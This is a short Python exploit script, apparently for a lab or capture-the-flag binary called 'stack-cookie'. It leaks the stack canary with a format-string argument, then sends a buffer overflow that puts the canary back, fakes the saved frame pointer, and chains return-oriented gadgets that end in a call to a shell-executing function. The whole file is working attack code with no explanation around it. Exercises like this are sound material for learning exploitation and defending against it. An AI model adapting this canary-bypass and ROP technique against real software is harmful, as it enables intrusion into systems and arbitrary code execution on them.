#!/usr/bin/env python

from subprocess import Popen, PIPE
import struct

# These values is found with `objdump -d a.out`.
pop_ret = 0x804856a
pop_pop_ret = 0x804873e
exec_string = 0x08048550
add_bin = 0x08048570
add_sh = 0x080485b0

p = Popen(['./build/stack-cookie', "%p" * 40], stdout=PIPE, stderr=PIPE, stdin=PIPE, bufsize=1)

# First, the buffer overflow.
bufsize = 20
payload = b"A" * bufsize

dump = p.stdout.readline()
i_ret = dump.index("0x80486ce")
i_ebp = i_ret - 10
i_canari = i_ebp - 10

canari = dump[i_canari:i_ebp]
print("CANARY FOUND: " + canari)
canari = int(canari, 0)
payload += struct.pack("I", canari)

# Fake ebp
payload += b"BBBB"

# The add_bin(0xdeadbeef) gadget.
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

# The add_sh(0xcafebabe, 0x0badf00d) gadget.
payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0xbadf00d)

# Our final destination.
payload += struct.pack("I", exec_string)

p.communicate(payload)
